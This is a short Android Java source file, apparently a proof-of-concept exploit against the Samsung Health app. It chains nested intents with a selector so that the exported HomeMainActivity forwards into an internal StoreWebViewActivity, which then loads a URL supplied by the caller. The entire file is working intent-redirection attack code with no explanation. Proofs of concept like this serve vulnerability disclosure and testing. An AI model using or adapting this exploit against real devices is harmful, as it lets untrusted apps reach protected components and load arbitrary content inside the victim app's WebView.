package poc.app;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent next = new Intent();
        next.putExtra("launch_by_sdk", true);
        next.setSelector(new Intent().setClassName("com.sec.android.app.shealth", "com.samsung.android.app.shealth.home.discover.StoreWebViewActivity"));
        next.putExtra("url", "http://example.com/");

        Intent i = new Intent();
        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
        i.setClassName("com.sec.android.app.shealth", "com.samsung.android.app.shealth.home.HomeMainActivity");
        i.putExtra("launch_intent", next);
        startActivity(i);
    }
}